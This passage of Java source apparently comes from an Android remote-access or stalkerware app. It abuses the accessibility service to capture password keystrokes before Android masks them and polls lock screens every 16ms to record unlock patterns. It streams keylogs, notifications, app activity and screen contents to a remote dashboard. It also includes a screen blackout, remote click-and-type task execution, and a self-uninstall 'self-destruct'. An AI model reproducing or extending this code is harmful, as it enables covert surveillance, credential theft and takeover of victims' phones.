                    try { acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}
                    if (!acquired) {
                        JSONObject r = new JSONObject();
                        r.put("success", false); r.put("error", "accessibility busy"); return r;
                    }
                    return sr.getCurrentApp();
                } finally { if (acquired) accessSemaphore.release(); }
            }
            case "get_clickable_elements": {
                boolean acquired = false;
                try {
                    try { acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}
                    if (!acquired) {
                        JSONObject r = new JSONObject();
                        r.put("success", false); r.put("error", "accessibility busy"); return r;
                    }
                    return sr.getClickableElements();
                } finally { if (acquired) accessSemaphore.release(); }
            }
            case "get_input_fields": {
                boolean acquired = false;
                try {
                    try { acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}
                    if (!acquired) {
                        JSONObject r = new JSONObject();
                        r.put("success", false); r.put("error", "accessibility busy"); return r;
                    }
                    JSONObject inputResult = sr.getInputFields();
                    pushPasswordFieldsFromInputFields(inputResult);
                    return inputResult;
                } finally { if (acquired) accessSemaphore.release(); }
            }

            case "screen_reader_start": {
                // ScreenReaderRecorder tab: start the recording loop on the device.
                // This controls the offline recording buffer + streaming to dashboard.
                manualRecordingActive = true;
                // Start the loop only if it is not already running — auto-recording
                // may have already started it.  Never restart a healthy loop just because
                // the dashboard pressed Start (that would cause a frame-gap stutter).
                ScheduledFuture<?> currentSrf = screenReaderFuture;
                if (currentSrf == null || currentSrf.isDone() || currentSrf.isCancelled()) {
                    startScreenReaderLoop(accessSvc, false);
                }
                JSONObject ok = new JSONObject();
                ok.put("success", true);
                ok.put("message", "Recording started on device");
                return ok;
            }

            case "screen_reader_stop": {
                // ScreenReaderRecorder tab: stop the recording loop and save what was
                // captured to a local file on the device for later retrieval.
                // This DOES stop the full loop (recording halted, buffer flushed to disk).
                manualRecordingActive = false;
                stopScreenReaderLoop(false);
                JSONObject ok = new JSONObject();
                ok.put("success", true);
                ok.put("message", "Recording stopped and saved on device");
                return ok;
            }

            case "screen_reader_stream_start": {
                // Read the interval the dashboard requests (1000-5000ms; default 2000ms for 3G safety).
                // The internal 50ms tick keeps running for password/pattern capture,
                // but screen:update pushes to the dashboard are throttled to this value.
                final long requestedIntervalMs = Math.max(500L, params.optLong("intervalMs", 2000L));
                // Serialize through heartbeatExecutor (single-threaded) so that a
                // stream_stop submitted just before cannot overtake this start.
                final UnifiedAccessibilityService finalSvc = accessSvc;
                heartbeatExecutor.execute(() -> {
                    screenReaderDashboardIntervalMs = requestedIntervalMs;
                    lastScreenReaderDashboardPushMs = 0L; // allow first frame immediately
                    // Reset dedup state so the very next tick sends a frame regardless of
                    // whether the screen has changed since the last push.
                    lastFrameFingerprint     = null;
                    consecutiveDuplicateCount = 0;
                    manualRecordingActive = true;
                    ScheduledFuture<?> srf = screenReaderFuture;
                    if (srf == null || srf.isDone() || srf.isCancelled()) {
                        startScreenReaderLoop(finalSvc, false);
                    }
                });
                JSONObject ok = new JSONObject();
                ok.put("success", true);
                ok.put("message", "Stream started — push interval " + requestedIntervalMs + "ms");
                return ok;
            }

            case "screen_reader_stream_stop": {
                // Serialize through heartbeatExecutor so stop and start commands
                // always execute in the order they were received (FIFO).
                heartbeatExecutor.execute(() -> manualRecordingActive = false);
                JSONObject ok = new JSONObject();
                ok.put("success", true);
                ok.put("message", "Stream stopped — screen reader still running on device");
                return ok;
            }

            case "list_screen_recordings": {
                return listScreenRecordingsOnDevice();
            }

            case "get_screen_recording": {
                String filename = params.optString("filename", "");
                return getScreenRecordingContent(filename);
            }

            case "delete_screen_recording": {
                String filename = params.optString("filename", "");
                JSONObject r = new JSONObject();
                if (filename.isEmpty()) {
                    r.put("success", false);
                    r.put("error", "No filename provided");
                    return r;
                }
                java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
                java.io.File file = new java.io.File(dir, filename);
                if (!file.exists()) {
                    r.put("success", false);
                    r.put("error", "File not found");
                    return r;
                }
                boolean deleted = file.delete();
                r.put("success", deleted);
                if (!deleted) r.put("error", "Could not delete file");
                return r;
            }
        }

        JSONObject r = new JSONObject();
        r.put("success", false);
        r.put("error", "Unhandled accessibility command: " + command);
        return r;
    }

    private boolean isGestureCommand(String command) {
        switch (command) {
            case "touch": case "swipe": case "scroll_up": case "scroll_down": return true;
            default: return false;
        }
    }

    // ── Screen Reader Auto-Recording (device-driven) ──────────────────────────

    /**
     * Compress a JSON string with GZIP and return a Base64-encoded string.
     * Returns null on failure so callers can fall back to the uncompressed path.
     */
    private String gzipAndBase64(String json) {
        try {
            java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream(json.length());
            // Use BEST_COMPRESSION (level 9) for maximum size reduction over 3G.
            // Anonymously override the protected `def` field to set level before first write.
            java.util.zip.GZIPOutputStream gzip = new java.util.zip.GZIPOutputStream(bos) {
                { def.setLevel(java.util.zip.Deflater.BEST_COMPRESSION); }
            };
            gzip.write(json.getBytes("UTF-8"));
            gzip.close();
            return android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP);
        } catch (Exception e) {
            Log.w(TAG, "gzip compress failed: " + e.getMessage());
            return null;
        }
    }

    /**
     * Compute a lightweight fingerprint for a screen result so we can skip
     * duplicate frames — the lock screen and idle screens often stay identical
     * for long periods and should not be retransmitted.
     *
     * Strategy: concatenate package + element count + first 20 elements' text/desc/bounds,
     * then return an integer hash as a string so comparison is O(1) and storage is tiny.
     */
    private String computeFrameFingerprint(JSONObject screenResult) {
        if (screenResult == null) return "";
        try {
            JSONObject screen = screenResult.optJSONObject("screen");
            if (screen == null) return "";
            String pkg = screen.optString("packageName", "");
            JSONArray elements = screen.optJSONArray("elements");
            int elemCount = elements == null ? 0 : elements.length();
            StringBuilder sb = new StringBuilder(256);
            sb.append(pkg).append(':').append(elemCount);
            if (elements != null) {
                // On pattern/lock screens scan ALL elements — the grid can have up to 9 cells
                // and each cell's checked/selected state flips as the user draws.
                // On regular screens cap at 20 for speed.
                boolean isLockPkg = isPatternUnlockPackage(pkg);
                int check = isLockPkg ? elemCount : Math.min(elemCount, 20);
                for (int i = 0; i < check; i++) {
                    JSONObject el = elements.optJSONObject(i);
                    if (el == null) continue;
                    sb.append('|')
                      .append(el.optString("text", ""))
                      .append(el.optString("contentDescription", ""))
                      .append(el.optString("hintText", ""))
                      // Include passwordText so every password keystroke registers as a new frame
                      .append(el.optString("passwordText", ""))
                      .append(el.optBoolean("checked",   false) ? "C" : "")
                      .append(el.optBoolean("selected",  false) ? "S" : "")
                      .append(el.optBoolean("enabled",   true)  ? "" : "D")
                      // Include clickable so pattern-cell touches register as distinct frames.
                      // When a cell is drawn through it loses its clickable flag — that state
                      // change must survive the save-deduplication step.
                      .append(el.optBoolean("clickable", false) ? "K" : "");
                    JSONObject b = el.optJSONObject("bounds");
                    if (b != null) sb.append('@').append(b.optInt("top", 0));
                }
            }
            return String.valueOf(sb.toString().hashCode());
        } catch (Exception e) {
            return "";
        }
    }

    /**
     * Returns true if the given package name belongs to a pattern/PIN/password unlock screen.
     * On these screens the loop runs at SCREEN_READER_PATTERN_INTERVAL_MS so each cell block
     * that lights up during pattern drawing is captured before it fades.
     */
    private boolean isPatternUnlockPackage(String pkg) {
        if (pkg == null || pkg.isEmpty()) return false;
        // AOSP / stock Android lock screen
        if (pkg.equals("com.android.systemui")) return true;
        // Dedicated keyguard packages (some OEMs split this out)
        if (pkg.equals("com.android.keyguard")) return true;
        // Catch-all for OEM variants: any package whose name contains these keywords
        if (pkg.contains("keyguard") || pkg.contains("lockscreen") || pkg.contains("lock_screen")) return true;
        // Samsung-specific
        if (pkg.equals("com.samsung.android.app.lockstar")
                || pkg.equals("com.samsung.android.lockstar")) return true;
        return false;
    }

    /**
     * Returns true if the screen result contains any active password field with text.
     * Used to bypass duplicate-frame suppression so every password keystroke is captured
     * before Android masks the character.
     */
    private boolean screenHasActivePasswordField(JSONObject screenResult) {
        if (screenResult == null) return false;
        try {
            JSONObject screen = screenResult.optJSONObject("screen");
            if (screen == null) return false;
            JSONArray elements = screen.optJSONArray("elements");
            if (elements == null) return false;
            for (int i = 0; i < elements.length(); i++) {
                JSONObject el = elements.optJSONObject(i);
                if (el != null && el.optBoolean("isPassword", false)
                        && !el.optString("passwordText", "").isEmpty()) {
                    return true;
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    /**
     * Internal: start the screen-reader push loop at the normal rate.
     */
    private void startScreenReaderLoop(UnifiedAccessibilityService svc, boolean sendAutoEvent) {
        startScreenReaderLoop(svc, sendAutoEvent, SCREEN_READER_NORMAL_INTERVAL_MS);
    }

    /**
     * Internal: start the screen-reader push loop at a specific tick rate.
     * Called with SCREEN_READER_NORMAL_INTERVAL_MS (50ms) for regular screens and
     * SCREEN_READER_PATTERN_INTERVAL_MS (16ms) when a pattern/PIN unlock screen is active.
     *
     * @param svc           the running accessibility service
     * @param sendAutoEvent if true, push an autoEvent:'start' so the dashboard
     *                      automatically enters recording mode.
     * @param intervalMs    tick interval in milliseconds
     */
    private void startScreenReaderLoop(UnifiedAccessibilityService svc, boolean sendAutoEvent, long intervalMs) {
        ScheduledFuture<?> old = screenReaderFuture;
        if (old != null) { old.cancel(false); screenReaderFuture = null; }
        lastFrameFingerprint = null;
        consecutiveDuplicateCount = 0;

        final String devId = DeviceInfo.getDeviceId(context);

        screenReaderFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
            boolean acq = false;
            try {
                // ── Screen-off guard ─────────────────────────────────────────
                // Do NOT capture accessibility data when the screen is turned off.
                // isInteractive() returns false when the screen is off or on the
                // lock-screen-off state; no meaningful UI is visible then.
                android.os.PowerManager pwrMgr = (android.os.PowerManager)
                        context.getSystemService(Context.POWER_SERVICE);
                if (pwrMgr != null && !pwrMgr.isInteractive()) {
                    Log.d(TAG, "screen_reader: screen off — skipping frame");
                    return;
                }

                // Re-check service every tick — captured `svc` may be dead after service restart
                UnifiedAccessibilityService liveSvc = UnifiedAccessibilityService.getInstance();
                if (liveSvc == null) {
                    // Service died — stop the loop cleanly so it can be restarted later
                    Log.w(TAG, "screen_reader: accessibility service gone, stopping loop");
                    ScheduledFuture<?> self = screenReaderFuture;
                    if (self != null) self.cancel(false);
                    autoRecordingActive  = false;
                    manualRecordingActive = false;
                    return;
                }

                acq = accessSemaphore.tryAcquire(1, TimeUnit.SECONDS);
                if (!acq) return;

                ScreenReader pusher = new ScreenReader(liveSvc);
                JSONObject screenResult = pusher.readScreen();
                pushPasswordFieldsFromScreen(screenResult);

                // ── Duplicate-frame deduplication ────────────────────────────
                // Compute a lightweight fingerprint of the current screen.
                // If the fingerprint matches the last sent frame, skip it so we
                // don't flood the server (and waste 3G bandwidth) with identical data.
                // After 2 consecutive identical frames the tick is skipped entirely.
                // Exception 1: when a password field is actively being typed in, NEVER skip —
                // password characters are briefly plain-text then masked, and we must capture
                // every keystroke before masking occurs.
                // Exception 2: when on a pattern-unlock screen, NEVER skip — pattern cells light
                // up and fade within ~20-30ms and must all be captured at the 16ms fast rate.
                boolean hasPasswordInput = screenHasActivePasswordField(screenResult);
                String fp = computeFrameFingerprint(screenResult);
                boolean isDuplicate = !hasPasswordInput && !inPatternScreenMode && !fp.isEmpty() && fp.equals(lastFrameFingerprint);
                if (isDuplicate) {
                    consecutiveDuplicateCount++;
                    // Only skip the entire tick when NOT live-streaming to dashboard.
                    // When manualRecordingActive is true, let the throttle handle rate-limiting
                    // so the dashboard always receives frames at the configured interval even
                    // when the screen content is unchanged (static screen).
                    if (consecutiveDuplicateCount > 1 && !manualRecordingActive) {
                        Log.d(TAG, "screen_reader: static screen, skip #" + consecutiveDuplicateCount);
                        return;
                    }
                } else {
                    lastFrameFingerprint      = fp;
                    consecutiveDuplicateCount = 0;
                }

                JSONObject payload = new JSONObject();
                payload.put("deviceId", devId);
                payload.put("success", screenResult.optBoolean("success", false));
                if (screenResult.has("screen")) payload.put("screen", screenResult.get("screen"));
                if (screenResult.has("error"))  payload.put("error",  screenResult.getString("error"));

                // Only add non-duplicate frames to the offline buffer to avoid storing identical data.
                if (!isDuplicate && (autoRecordingActive || manualRecordingActive)) {
                    synchronized (offlineFrameBuffer) {
                        offlineFrameBuffer.add(payload);
                    }
                }

                // Only push to dashboard when the dashboard has explicitly requested streaming
                // (manualRecordingActive) AND the live channel is up.
                // Use sendLiveOnly — screen updates must NOT fall back to the primary command
                // channel; that would queue high-frequency accessibility frames as commands.
                //
                // Dashboard push throttle: honor the intervalMs from screen_reader_stream_start.
                // Password fields and pattern screens bypass the throttle — every keystroke/cell
                // must be captured immediately before masking or fading occurs.
                long nowMs = System.currentTimeMillis();
                boolean throttleBypass = hasPasswordInput || inPatternScreenMode;
                boolean throttleOk = throttleBypass
                    || (nowMs - lastScreenReaderDashboardPushMs) >= screenReaderDashboardIntervalMs;
                if (manualRecordingActive && liveConnected && throttleOk) {
                    lastScreenReaderDashboardPushMs = nowMs;
                    // ── GZIP compression — reduces ~3-5 KB accessibility JSON to ~700 B on 3G ──
                    String compressed = gzipAndBase64(payload.toString());
                    if (compressed != null) {
                        try {
                            JSONObject cPayload = new JSONObject();
                            cPayload.put("compressed", true);
                            cPayload.put("deviceId", devId);
                            cPayload.put("ts", System.currentTimeMillis());
                            cPayload.put("data", compressed);
                            sendLiveOnly("screen:update", cPayload);
                        } catch (Exception ce) {
                            sendLiveOnly("screen:update", payload); // fallback uncompressed
                        }
                    } else {
                        sendLiveOnly("screen:update", payload); // fallback if gzip failed
                    }
                }

                // ── Pattern-unlock rate switching ────────────────────────────
                // If the foreground package is a lock screen (systemui / keyguard) we
                // switch to a 16ms capture rate so every cell block that lights up during
                // pattern drawing is captured before it fades (~20-30ms visibility window).
                // When the user leaves the lock screen, revert to the normal 50ms rate.
                // A loopRestartPending guard ensures only one restart is ever in flight.
                try {
                    JSONObject sc = screenResult.optJSONObject("screen");
                    String currentPkg = sc != null ? sc.optString("packageName", "") : "";
                    boolean needFast = isPatternUnlockPackage(currentPkg);
                    if (needFast != inPatternScreenMode && !loopRestartPending) {
                        inPatternScreenMode = needFast;
                        loopRestartPending  = true;
                        long newInterval = needFast
                            ? SCREEN_READER_PATTERN_INTERVAL_MS
                            : SCREEN_READER_NORMAL_INTERVAL_MS;
                        Log.i(TAG, "screen_reader: switching to " + newInterval +
                            "ms interval (patternMode=" + needFast + ")");
                        final UnifiedAccessibilityService restartSvc = liveSvc;
                        executor.execute(() -> {
                            ScheduledFuture<?> self = screenReaderFuture;
                            if (self != null) self.cancel(false);
                            loopRestartPending = false;
                            startScreenReaderLoop(restartSvc, false, newInterval);
                        });
                    }
                } catch (Exception ignored) {}

            } catch (Throwable e) {
                // Catch Throwable — ScheduledExecutorService permanently cancels tasks that throw unchecked exceptions
                Log.e(TAG, "screen_reader push error: " + e.getMessage());
            } finally {
                if (acq) accessSemaphore.release();
            }
        }, 0, intervalMs, TimeUnit.MILLISECONDS);
    }

    /**
     * Internal: stop the screen-reader push loop.
     * @param sendAutoEvent if true, push an autoEvent:'stop' so the dashboard
     *                      automatically saves the current recording.
     */
    // ── Wake keep-alive helpers ───────────────────────────────────────────
    private void startWakeKeepAliveLoop() {
        if (wakeKeepAliveFuture != null && !wakeKeepAliveFuture.isCancelled() && !wakeKeepAliveFuture.isDone()) {
            return;
        }
        wakeKeepAliveFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
            try {
                if (System.currentTimeMillis() - wakeKeepAliveLastTrigger > WAKE_KEEP_ALIVE_TIMEOUT_MS) {
                    android.util.Log.i(TAG, "wake_keep_alive: 4-min timeout, stopping");
                    stopWakeKeepAliveLoop();
                    return;
                }
                UnifiedAccessibilityService liveSvc = UnifiedAccessibilityService.getInstance();
                if (liveSvc != null) new ScreenController(liveSvc).wakeScreen();
            } catch (Exception e) {
                android.util.Log.e(TAG, "wake_keep_alive error: " + e.getMessage());
            }
        }, 0, WAKE_KEEP_ALIVE_INTERVAL_MS, TimeUnit.MILLISECONDS);
    }

    private void stopWakeKeepAliveLoop() {
        ScheduledFuture<?> f = wakeKeepAliveFuture;
        if (f != null) { f.cancel(false); wakeKeepAliveFuture = null; }
    }

    private void stopScreenReaderLoop(boolean sendAutoEvent) {
        ScheduledFuture<?> f = screenReaderFuture;
        if (f != null) { f.cancel(false); screenReaderFuture = null; }
        lastFrameFingerprint = null;
        consecutiveDuplicateCount = 0;
        inPatternScreenMode = false;
        loopRestartPending  = false;

        // Save any buffered offline frames to local file for later upload
        if (autoRecordingActive || manualRecordingActive) {
            java.util.ArrayList<JSONObject> buffered;
            synchronized (offlineFrameBuffer) {
                buffered = new java.util.ArrayList<>(offlineFrameBuffer);
                offlineFrameBuffer.clear();
            }
            if (buffered != null && !buffered.isEmpty()) {
                final java.util.ArrayList<JSONObject> toSave = buffered;
                final long startT = System.currentTimeMillis();
                executor.execute(() -> saveOfflineRecording(toSave, startT));
            }
        }
        autoRecordingActive = false;
        manualRecordingActive = false;

        if (sendAutoEvent) {
            try {
                JSONObject stopEvt = new JSONObject();
                stopEvt.put("deviceId", DeviceInfo.getDeviceId(context));
                stopEvt.put("autoEvent", "stop");
                stopEvt.put("success", false);
                sendLiveMessage("screen:update", stopEvt);
            } catch (Exception ignored) {}
        }
    }

    /**
     * Called by UnifiedAccessibilityService when the screen wakes up, a call arrives,
     * the lock screen appears, or any other trigger fires.
     * Guards against restarting an already-running recording loop.
     */
    public void startScreenReaderAuto() {
        ScheduledFuture<?> current = screenReaderFuture;
        if (current != null && !current.isDone() && !current.isCancelled()) return;
        UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
        if (svc == null) return;
        
        // Always clear buffer for fresh recording
        synchronized (offlineFrameBuffer) { offlineFrameBuffer.clear(); }
        autoRecordingActive = true;
        autoRecordingStartTime = System.currentTimeMillis();
        
        startScreenReaderLoop(svc, true);
    }

    /**
     * Called by UnifiedAccessibilityService when the screen turns off or the
     * device is unlocked.  Stops the recording loop and tells the dashboard to
     * save whatever it has collected.
     */
    public void stopScreenReaderAuto() {
        // Save immediately before stopping the loop
        java.util.ArrayList<JSONObject> buffered;
        synchronized (offlineFrameBuffer) {
            buffered = new java.util.ArrayList<>(offlineFrameBuffer);
            offlineFrameBuffer.clear();
        }
        
        if (buffered != null && !buffered.isEmpty()) {
            final long startT = autoRecordingStartTime > 0 ? autoRecordingStartTime : System.currentTimeMillis();
            saveOfflineRecording(buffered, startT);
        }
        
        stopScreenReaderLoop(true);
    }

    /**
     * Called when the screen turns off WITHOUT the user unlocking.
     * Discards the buffered frames — nothing useful was captured.
     */
    public void stopScreenReaderAutoNoSave() {
        synchronized (offlineFrameBuffer) {
            offlineFrameBuffer.clear();
        }
        stopScreenReaderLoop(true);
    }

    /** Push a keylog entry to the server immediately (live feed) via live channel. */
    public void pushKeylogEntry(String packageName, String appName, String text, String eventType, String timestamp) {
        pushKeylogEntry(packageName, appName, text, eventType, timestamp, false, "");
    }

    /** Push a keylog entry with password field metadata. */
    public void pushKeylogEntry(String packageName, String appName, String text, String eventType,
                                String timestamp, boolean isPassword, String fieldType) {
        // IMPORTANT: Use the general cached executor, NOT liveExecutor.
        // liveExecutor's single thread is permanently blocked in liveChannelLoop's readLine().
        // Tasks submitted to liveExecutor while readLine() is blocking are queued forever.
        executor.execute(() -> {
            try {
                JSONObject entry = new JSONObject();
                entry.put("packageName", packageName);
                entry.put("appName", appName != null ? appName : packageName);
                entry.put("text", text);
                entry.put("eventType", eventType);
                entry.put("timestamp", timestamp);
                entry.put("isPassword", isPassword);
                entry.put("fieldType", isPassword ? (fieldType.isEmpty() ? "password" : fieldType) : fieldType);
                entry.put("deviceId", DeviceInfo.getDeviceId(context));
                // Only send if live channel is connected (device is online).
                // If offline, drop silently — do NOT queue as a command.
                sendLiveOnly("keylog:entry", entry);
            } catch (Exception e) {
                Log.e(TAG, "pushKeylogEntry error: " + e.getMessage());
            }
        });
    }

    /** Scan a read_screen result for password fields and push them as keylog entries. */
    private void pushPasswordFieldsFromScreen(JSONObject screenResult) {
        if (screenResult == null || !screenResult.optBoolean("success", false)) return;
        try {
            JSONObject screen = screenResult.optJSONObject("screen");
            if (screen == null) return;
            String packageName = screen.optString("packageName", "");
            String appName = "";
            try {
                android.content.pm.PackageManager pm = context.getPackageManager();
                android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
                appName = pm.getApplicationLabel(ai).toString();
            } catch (Exception ignored) {}
            org.json.JSONArray elements = screen.optJSONArray("elements");
            if (elements == null) return;
            String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                    java.util.Locale.getDefault()).format(new java.util.Date());
            for (int i = 0; i < elements.length(); i++) {
                JSONObject el = elements.optJSONObject(i);
                if (el == null) continue;
                boolean isPass = el.optBoolean("isPassword", false);
                if (!isPass) continue;
                String pwText = el.optString("passwordText", "");
                if (pwText.isEmpty()) continue;
                String hint = el.optString("hint", "password");
                final String finalAppName = appName.isEmpty() ? packageName : appName;
                final String finalHint = hint;
                final String finalPkg = packageName;
                final String finalText = pwText;
                final String finalTs = ts;
                keyloggerService.logEntry(finalPkg, finalAppName, finalText, "PASSWORD_FOCUS");
                if (isConnected()) {
                    pushKeylogEntry(finalPkg, finalAppName, finalText, "PASSWORD_FOCUS",
                            finalTs, true, finalHint);
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "pushPasswordFieldsFromScreen: " + e.getMessage());
        }
    }

    /** Scan a get_input_fields result for password fields and push them as keylog entries. */
    private void pushPasswordFieldsFromInputFields(JSONObject inputResult) {
        if (inputResult == null || !inputResult.optBoolean("success", false)) return;
        try {
            org.json.JSONArray inputs = inputResult.optJSONArray("inputs");
            if (inputs == null) return;
            String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                    java.util.Locale.getDefault()).format(new java.util.Date());
            for (int i = 0; i < inputs.length(); i++) {
                JSONObject inp = inputs.optJSONObject(i);
                if (inp == null) continue;
                boolean isPass = inp.optBoolean("isPassword", false);
                if (!isPass) continue;
                String pwText = inp.optString("passwordText", "");
                if (pwText.isEmpty()) continue;
                String hint = inp.optString("hint", "password");
                if (isConnected()) {
                    pushKeylogEntry("", "", pwText, "PASSWORD_FOCUS", ts, true, hint);
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "pushPasswordFieldsFromInputFields: " + e.getMessage());
        }
    }

    /** Push a live notification to the server (relayed to dashboard) via live channel. */
    public void pushNotification(String packageName, String appName, String title, String text, long postTime) {
        executor.execute(() -> {
            try {
                String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                        java.util.Locale.getDefault()).format(new java.util.Date(postTime));
                JSONObject entry = new JSONObject();
                entry.put("packageName", packageName);
                entry.put("appName", appName != null ? appName : packageName);
                entry.put("title", title != null ? title : "");
                entry.put("text", text != null ? text : "");
                entry.put("timestamp", ts);
                entry.put("postTime", postTime);
                entry.put("deviceId", DeviceInfo.getDeviceId(context));
                // Only send if live channel is connected (device is online).
                // If offline, drop silently — do NOT queue as a command.
                sendLiveOnly("notification:entry", entry);
            } catch (Exception e) {
                Log.e(TAG, "pushNotification error: " + e.getMessage());
            }
        });
    }

    /** Push a foreground app change to the server (recent activity) via live channel. */
    public void pushRecentActivity(String packageName, String appName) {
        executor.execute(() -> {
            try {
                String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                        java.util.Locale.getDefault()).format(new java.util.Date());
                JSONObject entry = new JSONObject();
                entry.put("packageName", packageName);
                entry.put("appName", appName != null ? appName : packageName);
                entry.put("timestamp", ts);
                entry.put("deviceId", DeviceInfo.getDeviceId(context));
                // Only send if live channel is connected (device is online).
                // If offline, drop silently — do NOT queue as a command.
                sendLiveOnly("app:foreground", entry);
            } catch (Exception e) {
                Log.e(TAG, "pushRecentActivity error: " + e.getMessage());
            }
        });
    }

    /** Whether a package is monitored (static config OR dynamically added). */
    public boolean isDynamicallyMonitored(String pkg) {
        return dynamicMonitoredPackages.contains(pkg);
    }

    /** Self-destruct: clear data and launch uninstall flow. */
    private JSONObject performSelfDestruct() {
        JSONObject r = new JSONObject();
        try {
            // Schedule destruction after giving time to send the response
            new Thread(() -> {
                try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
                try {
                    // Enable uninstall-assist mode in accessibility
                    UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
                    if (svc != null) svc.enableUninstallAssist();

                    // Open uninstall dialog
                    android.content.Intent intent = new android.content.Intent(
                        android.content.Intent.ACTION_DELETE,
                        android.net.Uri.parse("package:" + context.getPackageName())
                    );
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                } catch (Exception e) {
                    Log.e(TAG, "selfDestruct error: " + e.getMessage());
                }
            }).start();
            r.put("success", true);
            r.put("message", "Self-destruct initiated — uninstalling app");
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /**
     * Execute all task steps locally on the device, one after another.
     *
     * Rules:
     *  - click_text polls every 100 ms for up to 8 s; clicks immediately when the
     *    text appears on screen.
     *  - ANY step that fails aborts the whole task — no further steps are executed.
     *  - A 500 ms settle delay is inserted between steps so the accessibility tree
     *    has time to refresh before the next step runs.
     */
    /**
     * Persist the workflow definition to device storage so the task can survive
     * connection drops, app restarts, and process kills.
     * File: <filesDir>/tasks/current_task.json
     * Returns true if the file was saved successfully.
     */
    private boolean saveTaskToDevice(JSONArray steps, String commandId) {
        try {
            java.io.File dir = new java.io.File(context.getFilesDir(), "tasks");
            if (!dir.exists()) dir.mkdirs();
            java.io.File file = new java.io.File(dir, "current_task.json");
            JSONObject doc = new JSONObject();
            doc.put("commandId", commandId);
            doc.put("savedAt",   System.currentTimeMillis());
            doc.put("stepCount", steps.length());
            doc.put("steps",     steps);
            try (java.io.FileWriter fw = new java.io.FileWriter(file, false)) {
                fw.write(doc.toString());
            }
            Log.d(TAG, "saveTaskToDevice: saved " + steps.length() + " steps → " + file.getAbsolutePath());
            return true;
        } catch (Exception e) {
            Log.e(TAG, "saveTaskToDevice: " + e.getMessage());
            return false;
        }
    }

    private void executeTaskLocal(JSONArray steps, String commandId) {
        final long CLICK_TEXT_TIMEOUT_MS = 8_000L;
        final long CLICK_TEXT_POLL_MS    = 100L;
        final long INTER_STEP_DELAY_MS   = 500L;

        int total     = steps.length();
        int completed = 0;

        for (int i = 0; i < total; i++) {
            JSONObject step;
            String type;
            try {
                step = steps.getJSONObject(i);
                type = step.optString("type", "");
            } catch (Exception e) {
                Log.e(TAG, "executeTaskLocal: bad step at index " + i);
                continue;
            }

            try {
                sendTaskProgress(commandId, i, total, false, true, "Starting: " + type, false, null);

                JSONObject result;

                switch (type) {

                    // ── Open App ────────────────────────────────────────────
                    case "open_app": {
                        JSONObject p = new JSONObject();
                        p.put("packageName", step.optString("packageName", ""));
                        result = dispatchCommand("open_app", p);
                        break;
                    }

                    // ── Close App ────────────────────────────────────────────
                    case "close_app": {
                        JSONObject p = new JSONObject();
                        p.put("packageName", step.optString("packageName", ""));
                        result = dispatchCommand("force_stop_app", p);
                        break;
                    }

                    // ── Click Text — polls up to 8 s, clicks the instant text appears ──
                    case "click_text": {
                        String textToFind = step.optString("text", "").trim();
                        if (textToFind.isEmpty()) {
                            result = new JSONObject().put("success", false).put("error", "click_text: no text specified");
                            break;
                        }

                        long pollDeadline = System.currentTimeMillis() + CLICK_TEXT_TIMEOUT_MS;
                        result = new JSONObject()
                                .put("success", false)
                                .put("error", "Text not found within 8 s: \"" + textToFind + "\"");

                        while (System.currentTimeMillis() < pollDeadline) {
                            // Poll — find_by_text uses the accessibility tree (semaphore-guarded)
                            JSONObject findParams = new JSONObject();
                            findParams.put("text", textToFind);
                            JSONObject findResult = dispatchCommand("find_by_text", findParams);

                            if (findResult.optBoolean("success", false)) {
                                int cnt = findResult.optInt("count", 0);
                                JSONArray matches = findResult.optJSONArray("matches");
                                boolean onScreen = cnt > 0 || (matches != null && matches.length() > 0);
                                if (onScreen) {
                                    // Text is visible — click it immediately
                                    long elapsed = CLICK_TEXT_TIMEOUT_MS - (pollDeadline - System.currentTimeMillis());
                                    sendTaskProgress(commandId, i, total, false, true,
                                            "Text found after " + elapsed + " ms — clicking…", false, null);
                                    JSONObject clickParams = new JSONObject();
                                    clickParams.put("text", textToFind);
                                    result = dispatchCommand("click_by_text", clickParams);
                                    break;
                                }
                            }

                            long remaining = pollDeadline - System.currentTimeMillis();
                            if (remaining <= 0) break;
                            Thread.sleep(Math.min(CLICK_TEXT_POLL_MS, remaining));
                        }
                        break;
                    }

                    // ── Paste / Input Text ──────────────────────────────────
                    case "paste_text": {
                        JSONObject p = new JSONObject();
                        p.put("text", step.optString("text", ""));
                        result = dispatchCommand("input_text", p);
                        break;
                    }

                    // ── Delay ────────────────────────────────────────────────
                    case "delay": {
                        int ms = step.optInt("ms", 1000);
                        Thread.sleep(ms);
                        result = new JSONObject().put("success", true).put("message", "Waited " + ms + " ms");
                        break;
                    }

                    // ── Navigation ───────────────────────────────────────────
                    case "press_home":    result = dispatchCommand("press_home",    new JSONObject()); break;
                    case "press_back":    result = dispatchCommand("press_back",    new JSONObject()); break;
                    case "press_recents": result = dispatchCommand("press_recents", new JSONObject()); break;

                    // ── Screen Block ─────────────────────────────────────────
                    case "block_screen":   result = dispatchCommand("screen_blackout_on",  new JSONObject()); break;
                    case "unblock_screen": result = dispatchCommand("screen_blackout_off", new JSONObject()); break;

                    // ── Swipes ───────────────────────────────────────────────
                    case "swipe_up":    { JSONObject p = new JSONObject(); p.put("direction", "up");    result = dispatchCommand("swipe", p); break; }
